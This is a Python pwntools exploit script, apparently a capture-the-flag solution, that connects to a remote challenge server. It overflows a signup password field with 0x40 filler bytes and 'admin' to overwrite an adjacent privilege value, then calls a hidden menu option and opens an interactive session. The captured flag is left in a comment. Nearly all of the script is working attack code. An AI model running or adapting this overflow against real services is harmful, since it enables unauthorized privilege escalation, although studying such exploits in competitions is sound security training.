#!/usr/bin/env python3
from pwn import *

elf = ELF("./pwn")
context.update(binary=elf, log_level="debug")
# p = elf.process()
# p = gdb.debug(
#     "./pwn",
#     """
#     b *main+108
#     b *main+120
#     b *main+132
#     b *main+142
#     """,
# )
p = remote("139.180.137.100", "1337")

def login(username, passwd):
    p.sendlineafter(b'Exit\n', b'1')
    p.sendlineafter(b'username:\n', username)
    p.sendlineafter(b'passwd:\n', passwd)
    return

def signup(username, passwd):
    p.sendlineafter(b'Exit\n', b'2')
    p.sendlineafter(b'username:\n', username)
    p.sendlineafter(b'passwd:\n', passwd)
    return 

def exit():
    p.sendlineafter(b'Exit\n', b'3')
    return


# x/2gx &old_user
# x/2gx &old_passwd

payload = b"A" * 0x40
payload += b"admin\x00"
signup(b"nigmaz", payload)

p.sendlineafter(b'Exit\n', b'4')

p.interactive()


# ASCIS{n0w_y0u_h4v3_f1rst_fl4g}
